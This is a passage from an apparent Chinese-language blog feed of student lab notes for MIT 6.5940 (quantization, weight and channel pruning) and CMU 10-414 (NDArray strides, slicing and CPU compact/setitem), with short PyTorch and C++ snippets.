bitwidth</span>)<br></code></pre></td></tr></table></figure><h2 id="Special-case-linear-quantization-on-weight-tensor"><a href="#Special-case-linear-quantization-on-weight-tensor" class="headerlink" title="Special case: linear quantization on weight tensor"></a>Special case: linear quantization on weight tensor</h2><p>由于参数矩阵的数据特征往往是对称的，因此可以直接认为Z是0，由此可以得到</p><p><img src="http://woaixiaoxiao-image.oss-cn-beijing.aliyuncs.com/img/image-20231205143149518.png" alt="image-20231205143149518"></p><h3 id="Per-channel-Linear-Quantization"><a href="#Per-channel-Linear-Quantization" class="headerlink" title="Per-channel Linear Quantization"></a>Per-channel Linear Quantization</h3><ol><li>遍历每一个out_channel得到对应scale，z就直接为0</li></ol><p>这中间需要用到一些tensor形状的骚操作</p><ol><li>可以通过<code>select(dim,index)</code>得到某个子tensor</li><li>在遍历完之后得到的scale存在一个一维的tensor中，想要通过它直接得到整个tensor的量化结果，需要先将它的形状view成[-1,1,1,,1,1]，这样才能复用之前的函数，直接通过广播正确的将scale发送到正确的位置</li></ol><h2 id="Quantized-Inference"><a href="#Quantized-Inference" class="headerlink" title="Quantized Inference"></a>Quantized Inference</h2><p><img src="http://woaixiaoxiao-image.oss-cn-beijing.aliyuncs.com/img/image-20231205144802583.png" alt="image-20231205144802583"></p><h3 id="Question-6-5-pts"><a href="#Question-6-5-pts" class="headerlink" title="Question 6 (5 pts)"></a>Question 6 (5 pts)</h3><p>计算了$S_{bias}$的量化结果</p><p><code>bias_scale = input_scale*weight_scale</code></p><h3 id="Quantized-Fully-Connected-Layer"><a href="#Quantized-Fully-Connected-Layer" class="headerlink" title="Quantized Fully-Connected Layer"></a>Quantized Fully-Connected Layer</h3><p>在<code>quantized_linear</code>中完成输出的scale操作</p><p>其中input和output的scale都是常数，而weight的scale的形状则是$[oc,1,1,1]$，而output的形状是$bs,oc$，因此需要将weight调成$1,oc$，这样在output和weight操作时，就可以自动广播成output的形状</p><p>然后就是在和浮点数操作的时候，需要将int转为float，这样应该是为了在计算的时候增加精度，因此需要将output的数据类型编程float</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">output = output.to(<span class="hljs-built_in">float</span>) * \<br>        (input_scale * (weight_scale).view(<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>) \<br>         / output_scale)<br></code></pre></td></tr></table></figure><h4 id="Question-8-15-pts"><a href="#Question-8-15-pts" class="headerlink" title="Question 8 (15 pts)"></a>Question 8 (15 pts)</h4><p>和矩阵乘法基本一样，注意维度的转换即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">output = output.to(<span class="hljs-built_in">float</span>) * (<br>    weight_scale.view(<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>) * input_scale / output_scale<br>)<br></code></pre></td></tr></table></figure><h2 id="Question-9-10-pts"><a href="#Question-9-10-pts" class="headerlink" title="Question 9 (10 pts)"></a>Question 9 (10 pts)</h2><p>将0-1映射到-128-127，先乘256，再减128</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">(x * <span class="hljs-number">255</span> - <span class="hljs-number">128</span>).clamp(-<span class="hljs-number">128</span>, <span class="hljs-number">127</span>).to(torch.int8)<br></code></pre></td></tr></table></figure><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>k-means方法</p><ol><li>只是用更少的float32来存储，但是真正要使用的时候，全是float32</li><li>因此，兼容性更好，速度更快，但是因为只有几个值可以选，因此准确率较低</li></ol><p>线性量化法</p><ol><li>将浮点数全部线性地变成整数，需要的时候又全部线性变回浮点数，其中S是float32，Z是int类型</li><li>相比于k-means，可选的数更多，更加灵活。但是因为需要不停地进行计算（float-int-float），所以相对较慢。虽然可以通过公式化简直接使用int类型去计算，但是目前有些操作还不支持int，所以需要额外的硬件和软件支持</li></ol><p>再凝练一点</p><p>普通的训练是，用float存，float算</p><p>k-means，用int存，用float算</p><p>线性量化，用int存，用int算（合并简化公式）</p>]]></content>
    
    
    <categories>
      
      <category>模型压缩/加速</category>
      
      <category>MIT6.5940</category>
      
    </categories>
    
    
    <tags>
      
      <tag>模型压缩/加速</tag>
      
      <tag>MIT6.5940</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>6.5940_lab1</title>
    <link href="/2023/11/24/6-5940-lab1/"/>
    <url>/2023/11/24/6-5940-lab1/</url>
    
    <content type="html"><![CDATA[<p>已定义的类和函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 模型相关</span><br><span class="hljs-comment"># 模型的定义</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">VGG</span>(nn.Module)<br><span class="hljs-comment"># 模型训练函数</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">train</span>(<span class="hljs-params"></span><br><span class="hljs-params">  model: nn.Module,</span><br><span class="hljs-params">  dataloader: DataLoader,</span><br><span class="hljs-params">  criterion: nn.Module,</span><br><span class="hljs-params">  optimizer: Optimizer,</span><br><span class="hljs-params">  scheduler: LambdaLR,</span><br><span class="hljs-params">  callbacks = <span class="hljs-literal">None</span></span><br><span class="hljs-params"></span>) -&gt; <span class="hljs-literal">None</span><br><span class="hljs-comment"># 模型评估函数</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">evaluate</span>(<span class="hljs-params"></span><br><span class="hljs-params">  model: nn.Module,</span><br><span class="hljs-params">  dataloader: DataLoader,</span><br><span class="hljs-params">  verbose=<span class="hljs-literal">True</span>,</span><br><span class="hljs-params"></span>) -&gt; <span class="hljs-built_in">float</span><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 模型指标相关</span><br><span class="hljs-comment"># 模型的mac（乘法和加法）</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_model_macs</span>(<span class="hljs-params">model, inputs</span>)<br><span class="hljs-comment"># 单个tensor的稀疏性</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_sparsity</span>(<span class="hljs-params">tensor: torch.Tensor</span>)<br><span class="hljs-comment"># 模型的稀疏性</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_model_sparsity</span>(<span class="hljs-params">model: nn.Module</span>)<br><span class="hljs-comment"># 模型的参数数量</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_num_parameters</span>(<span class="hljs-params">model: nn.Module, </span><br><span class="hljs-params">            count_nonzero_only=<span class="hljs-literal">False</span></span>)<br><span class="hljs-comment"># 模型的size</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_model_size</span>(<span class="hljs-params">model: nn.Module, </span><br><span class="hljs-params">       data_width=<span class="hljs-number">32</span>, count_nonzero_only=<span class="hljs-literal">False</span></span>)<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 测试细粒度剪枝的效果</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">test_fine_grained_prune</span><br></code></pre></td></tr></table></figure><h1 id="Fine-grained-Pruning"><a href="#Fine-grained-Pruning" class="headerlink" title="Fine-grained Pruning"></a>Fine-grained Pruning</h1><h2 id="Magnitude-based-Pruning"><a href="#Magnitude-based-Pruning" class="headerlink" title="Magnitude-based Pruning"></a>Magnitude-based Pruning</h2><ol><li>得到稀疏率</li><li>根据稀疏率找到最小的第k个值（threshold）</li><li>将小于这个值的都置为0（通过一个mask矩阵完成）</li></ol><p><img src="http://woaixiaoxiao-image.oss-cn-beijing.aliyuncs.com/img/image-20231203143614877.png" alt="image-20231203143614877"></p><h3 id="Question-2-15-pts"><a href="#Question-2-15-pts" class="headerlink" title="Question 2 (15 pts)"></a>Question 2 (15 pts)</h3><p>照着hints翻译代码即可，需要注意的是</p><ol><li><code>kthvalue</code>函数是默认对指定dim或者最后一维操作的，因此对于二维tensor，需要先展平，再求第k小</li><li><code>kthvalue</code>函数返回的是一个类，我们只需要这个类中的value</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">##################### YOUR CODE STARTS HERE #####################</span><br><span class="hljs-comment"># Step 1: calculate the #zeros (please use round())</span><br>num_zeros = <span class="hljs-built_in">round</span>(num_elements*sparsity)<br><span class="hljs-comment"># Step 2: calculate the importance of weight</span><br>importance = torch.<span class="hljs-built_in">abs</span>(tensor)<br><span class="hljs-comment"># Step 3: calculate the pruning threshold</span><br>threshold = torch.kthvalue(importance.view(-<span class="hljs-number">1</span>),num_zeros).values<br><span class="hljs-comment"># Step 4: get binary mask (1 for nonzeros, 0 for zeros)</span><br>mask = torch.gt(importance,threshold)<br><span class="hljs-comment">##################### YOUR CODE ENDS HERE #######################</span><br></code></pre></td></tr></table></figure><h3 id="Question-3-5-pts"><a href="#Question-3-5-pts" class="headerlink" title="Question 3 (5 pts)"></a>Question 3 (5 pts)</h3><p>留下十个非零的数，总共25个数，即稀疏率要达到15&#x2F;25，即0.6</p><p>然后包装了一个类<code>FineGrainedPruner</code></p><ol><li>在<code>__init__</code>中调用了<code>prune</code>，将这个模型的所有全连接层和卷积层的MASK都得到</li><li>以后每次调用<code>apply</code>，都直接用之前得到的MASK处理模型</li></ol><p>这样相当于就固定了MASK，每次直接用就行，不需要重新计算</p><h2 id="Sensitivity-Scan"><a href="#Sensitivity-Scan" class="headerlink" title="Sensitivity Scan"></a>Sensitivity Scan</h2><p>稀疏度和剪枝后的准确率</p><p><img src="http://woaixiaoxiao-image.oss-cn-beijing.aliyuncs.com/img/image-20231203153632677.png" alt="image-20231203153632677"></p><p>参数分布</p><p><img src="http://woaixiaoxiao-image.oss-cn-beijing.aliyuncs.com/img/image-20231203153659267.png" alt="image-20231203153659267"></p><h3 id="Question-5-10-pts"><a href="#Question-5-10-pts" class="headerlink" title="Question 5 (10 pts)"></a>Question 5 (10 pts)</h3><p>25%的大小，微调之后达到%92.5的准确率，其中微调的代码已经写好了</p><p>因此，在这里只需要调参，使得模型的大小位于%25以下。做法就是</p><ol><li>尽量调参数比较大的层</li><li>尽量调靠后的层</li><li>不要对着一个层拼命地薅</li></ol><p>通过这样调，让准确率降到了87.66%，但是在微调之后，回到了%92.5以上，因此有着百分之五的提升空间</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&#x27;backbone.conv3.weight&#x27;</span>: <span class="hljs-number">0.6</span>,<br><span class="hljs-string">&#x27;backbone.conv4.weight&#x27;</span>: <span class="hljs-number">0.7</span>,<br><span class="hljs-string">&#x27;backbone.conv5.weight&#x27;</span>: <span class="hljs-number">0.8</span>,<br><span class="hljs-string">&#x27;backbone.conv6.weight&#x27;</span>: <span class="hljs-number">0.8</span>,<br><span class="hljs-string">&#x27;backbone.conv7.weight&#x27;</span>: <span class="hljs-number">0.9</span>,<br></code></pre></td></tr></table></figure><p>微调的代码就是重新训练了几轮</p><h1 id="Channel-Pruning"><a href="#Channel-Pruning" class="headerlink" title="Channel Pruning"></a>Channel Pruning</h1><h2 id="Remove-Channel-Weights"><a href="#Remove-Channel-Weights" class="headerlink" title="Remove Channel Weights"></a>Remove Channel Weights</h2><h3 id="Question-6-10-pts"><a href="#Question-6-10-pts" class="headerlink" title="Question 6 (10 pts)"></a>Question 6 (10 pts)</h3><h4 id="简单剪枝（直接保留前若干个）"><a href="#简单剪枝（直接保留前若干个）" class="headerlink" title="简单剪枝（直接保留前若干个）"></a>简单剪枝（直接保留前若干个）</h4><p>在这里只需要将输出通道中的前new个保留即可</p><p>第一步是在这个函数<code>get_num_channels_to_keep</code>中根据比例和现在的通道数计算保留下来的通道数，很简单，但是要注意对于乘法的结果要round，而不能用代码提供的int，大坑！</p><p>第二步是添加一行代码，使得卷积前后的通道数匹配地上，即前一个卷积操作的输出通道，是后一个卷积操作的输入通道，而在pytorch中卷积核是以$c_{out},c_{int},h,w$排布的，因此只需要这一行代码即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">next_conv.weight.set_(next_conv.weight.detach()[:,:n_keep])<br></code></pre></td></tr></table></figure><h4 id="Ranking-Channels-by-Importance"><a href="#Ranking-Channels-by-Importance" class="headerlink" title="Ranking Channels by Importance"></a>Ranking Channels by Importance</h4><p>这一步操作其实并不是直接对channel按importance排序后剪裁，而只是将现有的conv层都按管道的重要性排个序就行了</p><p>首先在<code>get_input_channel_importance</code>得到某个conv层的输入管道的importance，只需要一行代码<code>importance = torch.norm(channel_weight)</code></p><p>然后模仿着对pre_conv的处理加个代码即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">next_conv.weight.copy_(torch.index_select(<br>    next_conv.weight.detach(),<span class="hljs-number">1</span>,sort_idx<br>))<br></code></pre></td></tr></table></figure><p>这里实验给的代码用了一个很骚的操作，对于每个conv</p><ol><li><p>先得到这个conv所有输入层的importance</p></li><li><p>对这个importance排序，但是不直接改变数组（这里是tensor的数组），而是得到一个index数组，index[i]记录着第i重要的（i越小越重要），得到这样的一个效果</p><p> <img src="http://woaixiaoxiao-image.oss-cn-beijing.aliyuncs.com/img/image-20231203172836708.png" alt="image-20231203172836708"></p></li><li><p>然后根据这个index数组将原来的conv的参数重新排序后赋值</p></li></ol><h3 id="Measure-acceleration-from-pruning"><a href="#Measure-acceleration-from-pruning" class="headerlink" title="Measure acceleration from pruning"></a>Measure acceleration from pruning</h3><p>相比于fine-grained的剪枝，基于channel的可以直接带来模型size的下降和计算速度的提升，因为实打实地减少了很多channel，节省了计算量</p>]]></content>
    
    
    <categories>
      
      <category>模型压缩/加速</category>
      
      <category>MIT6.5940</category>
      
    </categories>
    
    
    <tags>
      
      <tag>模型压缩/加速</tag>
      
      <tag>MIT6.5940</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>cmu10414_lab4</title>
    <link href="/2023/11/20/cmu10414-lab4/"/>
    <url>/2023/11/20/cmu10414-lab4/</url>
    
    <content type="html"><![CDATA[<h1 id="熟悉-NDArray"><a href="#熟悉-NDArray" class="headerlink" title="熟悉 NDArray"></a>熟悉 NDArray</h1><p>NDArray类本质上就是对真正的数据进行了抽象，它主要由以下几部分组成</p><ol><li>handle，其实代表的就是数据，而这个数据是以一个一维数组的形式存在</li><li>shape，虽然数据本质上是一维存在，但是我们在使用时，肯定是要用到多维数组的，这个shape就指定了这个多维数组</li><li>stride，stride可以指定每一维包含多少数据，可以方便地改变我们对数据的shape的解释</li><li>offest，表示当前NDArray的数据在handle中的起始位置</li><li>device，表示是在哪种设备上</li></ol><h1 id="Part-1-Python-array-operations"><a href="#Part-1-Python-array-operations" class="headerlink" title="Part 1: Python array operations"></a>Part 1: Python array operations</h1><h2 id="reshape"><a href="#reshape" class="headerlink" title="reshape"></a>reshape</h2><p>只需要修改shape和stride，其中stride可以通过<code>compact_strides</code>得到</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">if</span> self.size != <span class="hljs-built_in">prod</span>(new_shape):<br>    raise <span class="hljs-built_in">ValueError</span>()<br><span class="hljs-keyword">if</span> self.<span class="hljs-built_in">is_compact</span>() is False:<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">ValueError</span>()<br><span class="hljs-keyword">return</span> NDArray.<span class="hljs-built_in">make</span>(<br>    new_shape,<br>    self.<span class="hljs-built_in">compact_strides</span>(new_shape),<br>    self.device,<br>    self._handle,<br>    self._offset<br>    )<br></code></pre></td></tr></table></figure><h2 id="permute"><a href="#permute" class="headerlink" title="permute"></a>permute</h2><p><code>permute(self, new_axes)</code>，通过指定axes来打乱原先的维度，要做的也只是修改shape和stride</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c++">new_shape = <span class="hljs-built_in">tuple</span>(np.<span class="hljs-built_in">array</span>(self.shape)[<span class="hljs-built_in">list</span>(new_axes)])<br>new_stride = <span class="hljs-built_in">tuple</span>(np.<span class="hljs-built_in">array</span>(self.strides)[<span class="hljs-built_in">list</span>(new_axes)])<br><span class="hljs-keyword">return</span> NDArray.<span class="hljs-built_in">make</span>(<br>    new_shape,<br>    new_stride,<br>    self.device,<br>    self._handle,<br>    self._offset<br>    )<br></code></pre></td></tr></table></figure><h2 id="broadcast-to"><a href="#broadcast-to" class="headerlink" title="broadcast_to"></a>broadcast_to</h2><p><code>broadcast_to(self, new_shape)</code>，将一些长度为1的维度广播成指定的长度，要改变shape和stride，其中stride就是将广播的维度的stride都设置为0即可</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-built_in">assert</span> (<span class="hljs-built_in">len</span>(new_shape) == <span class="hljs-built_in">len</span>(self.shape))<br>new_stride = np.<span class="hljs-built_in">array</span>(self.strides)<br><span class="hljs-keyword">for</span> i in <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(self.shape)):<br>    <span class="hljs-keyword">if</span> self.shape[i] != new_shape[i]:<br>        <span class="hljs-keyword">if</span> self.shape[i] != <span class="hljs-number">1</span>:<br>            raise AssertionError<br>        <span class="hljs-keyword">else</span>:<br>            new_stride[i] = <span class="hljs-number">0</span><br><span class="hljs-keyword">return</span> NDArray.<span class="hljs-built_in">make</span>(<br>    <span class="hljs-built_in">tuple</span>(new_shape), <span class="hljs-built_in">tuple</span>(<br>        new_stride), self.device, self._handle, self._offset<br>    )<br></code></pre></td></tr></table></figure><h2 id="getitem"><a href="#getitem" class="headerlink" title="getitem"></a>getitem</h2><p><code>__getitem__(self, idxs)</code>，这是对取值符号<code>[]</code>的重载，框架保证idxs是一个元组，并且里面的每个元素都是切片的形式，并且都是从前往后遍历的常规切片，格式为$[start,stop,step]$</p><p>这里shape，stride，offset都要修改</p><p>shape：计算出切片之后，每个维度还剩下的长度</p><p>stride：在原来的stride基础上，乘上切片指定的step</p><p>offset：计算切片的起始位置（每个维度都要）</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c++"># BEGIN YOUR SOLUTION<br># 计算新的shape<br>new_shape = []<br><span class="hljs-keyword">for</span> sl in idxs:<br>    start, end, step = sl.start, sl.stop, sl.step<br>    new_shape.<span class="hljs-built_in">append</span>(math.<span class="hljs-built_in">ceil</span>((end - start) / step))<br># 计算新的offset<br>offset = []<br><span class="hljs-keyword">for</span> st, sl in <span class="hljs-built_in">zip</span>(self.strides, idxs):<br>    offset.<span class="hljs-built_in">append</span>(st * sl.start)<br>new_offset = <span class="hljs-built_in">sum</span>(np.<span class="hljs-built_in">array</span>(offset))<br># 计算新的stride<br>new_strides = []<br><span class="hljs-keyword">for</span> st, sl in <span class="hljs-built_in">zip</span>(self.strides, idxs):<br>    new_strides.<span class="hljs-built_in">append</span>(st * sl.step)<br><span class="hljs-keyword">return</span> NDArray.<span class="hljs-built_in">make</span>(<br>    <span class="hljs-built_in">tuple</span>(new_shape),<br>    <span class="hljs-built_in">tuple</span>(new_strides),<br>    self.device,<br>    self._handle,<br>    new_offset<br>    )<br># END YOUR SOLUTION<br></code></pre></td></tr></table></figure><h1 id="Part-2-CPU-Backend-Compact-and-setitem"><a href="#Part-2-CPU-Backend-Compact-and-setitem" class="headerlink" title="Part 2: CPU Backend - Compact and setitem"></a>Part 2: CPU Backend - Compact and setitem</h1><p>这个部分要完成三个函数，但是基本一样</p><h2 id="compact"><a href="#compact" class="headerlink" title="compact"></a>compact</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Compact</span><span class="hljs-params">(<span class="hljs-type">const</span> AlignedArray &amp;a, AlignedArray *out, std::vector&lt;<span class="hljs-type">int32_t</span>&gt; shape,std::vector&lt;<span class="hljs-type">int32_t</span>&gt; strides, <span class="hljs-type">size_t</span> offset)</span></span><br></code></pre></td></tr></table></figure><p>a是一个不紧凑的数组，要将其按照shape，strides和offset的格式紧凑到out中，本来就是一个多重循环就搞定了，但是因为这里shape的维度不定，不知道要写几重循环，所以需要模拟循环多重的过程</p><h2 id="EwiseSetitem"><a href="#EwiseSetitem" class="headerlink" title="EwiseSetitem"></a>EwiseSetitem</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">EwiseSetitem</span><span class="hljs-params">(<span class="hljs-type">const</span> AlignedArray&amp; a, AlignedArray* out, std::vector&lt;<span class="hljs-type">uint32_t</span>&gt; shape,</span></span><br><span class="hljs-params"><span class="hljs-function">                  std::vector&lt;<span class="hljs-type">uint32_t</span>&gt; strides, <span class="hljs-type">size_t</span> offset)</span></span><br></code></pre></td></tr></table></figure><p>这里面a是一个紧凑数组，out不是紧凑的，后面的三个参数是用来形容out的</p><p>这里是将一个紧凑的变成一个不紧凑的，可以用来实现切片复制，比如<code>a[,3:4,]=b</code></p><h2 id="ScalarSetitem"><a href="#ScalarSetitem" class="headerlink" title="ScalarSetitem"></a>ScalarSetitem</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">ScalarSetitem</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">size_t</span> size, <span class="hljs-type">scalar_t</span> val, AlignedArray *out, std::vector&lt;<span class="hljs-type">int32_t</span>&gt; shape,</span></span><br><span class="hljs-params"><span class="hljs-function">                   std::vector&lt;<span class="hljs-type">int32_t</span>&gt; strides, <span class="hljs-type">size_t</span> offset)</span></span><br></code></pre></td></tr></table></figure><p>将值设置为固定值</p><h2 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h2><p>要注意的是，这里面a和out的需要操作的数量一定是相同的</p><p>即不紧凑的那个的shape和stride相乘之和，一定等于紧凑的那个的cnt</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">RealOp</span><span class="hljs-params">(<span class="hljs-type">const</span> AlignedArray *a, AlignedArray *out, std::vector&lt;<span class="hljs-type">int32_t</span>&gt; shape,</span></span><br><span class="hljs-params"><span class="hljs-function">            std::vector&lt;<span class="hljs-type">int32_t</span>&gt; strides, <span class="hljs-type">size_t</span> offset, OpMode mode, <span class="hljs-type">int</span> val)</span> </span>&#123;<br>    <span class="hljs-type">int</span> for_len = shape.<span class="hljs-built_in">size</span>();             <span class="hljs-comment">// for循环的层数</span><br>    <span class="hljs-function">std::vector&lt;<span class="hljs-type">uint32_t</span>&gt; <span class="hljs-title">loop</span><span class="hljs-params">(for_len, <span class="hljs-number">0</span>)</span></span>; <span class="hljs-comment">// 记录当前各层的循环次数，0代表最外层，for_len-1代表最里面</span><br>    <span class="hljs-type">int</span> cnt = <span class="hljs-number">0</span>;                            <span class="hljs-comment">// out的指针</span><br>    <span class="hljs-comment">// 开始循环</span><br>    <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) &#123;<br>        <span class="hljs-comment">// 计算a的索引，并给out赋值</span><br>        <span class="hljs-type">int</span> idx = offset;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; for_len; i++) &#123;<br>            idx += loop[i] * strides[i];<br>        &#125;<br>        <span class="hljs-keyword">switch</span> (mode) &#123;<br>        <span class="hljs-keyword">case</span> in_mode:<br>            out-&gt;ptr[cnt] = a-&gt;ptr[idx];<br>            cnt += <span class="hljs-number">1</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> out_mode:<br>            out-&gt;ptr[idx] = a-&gt;ptr[cnt];<br>            cnt += <span class="hljs-number">1</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> set_mode:<br>            out-&gt;ptr[idx] = val;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>        <span class="hljs-comment">// 更新loop，先更新最内层，然后根据有没有超出shape判断是否要更新上一层的loop</span><br>        <span class="hljs-type">int</span> modify_idx = for_len - <span class="hljs-number">1</span>;<br>        loop[modify_idx] += <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">while</span> (loop[modify_idx] == shape[modify_idx]) &#123;<br>            <span class="hljs-keyword">if</span> (modify_idx == <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-keyword">return</span>;<br>            &#125;<br>            loop[modify_idx] = <span class="hljs-number">0</span>;<br>            modify_idx -= <span class="hljs-number">1</span>;<br>            loop[modify_idx] += <span class="hljs-number">1</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="Part-3-CPU-Backend-Elementwise-and-scalar-operations"><a href="#Part-3-CPU-Backend-Elementwise-and-scalar-operations" class="headerlink" title="Part 3: CPU Backend - Elementwise and scalar operations"></a>Part 3: CPU Backend - Elementwise and scalar operations</h1><p>实现各种操作，通过std提供的数学函数来实现都比较简单</p><p>这里可以看一下Python文件和C文件是怎么联动的</p><p>通过<code>m.def(&quot;ewise_mul&quot;, EwiseMul);</code>就可以将python中的<code>ewise_mul</code>对应到c语言的<code>EwiseMul</code></p><p>而在Python文件中，先对操作符进行重载，然后将相关的ewise或者scalar函数当做参数传入<code>ewise_or_scalar</code>函数。这个函数进一步根据other的类型选择执行哪个</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c++">self.<span class="hljs-built_in">ewise_or_scalar</span>(<br>            other, self.device.ewise_mul, self.device.scalar_mul<br>            )<br></code></pre></td></tr></table></figure><p>如果other是ndarray，就会执行</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-built_in">ewise_func</span>(self.<span 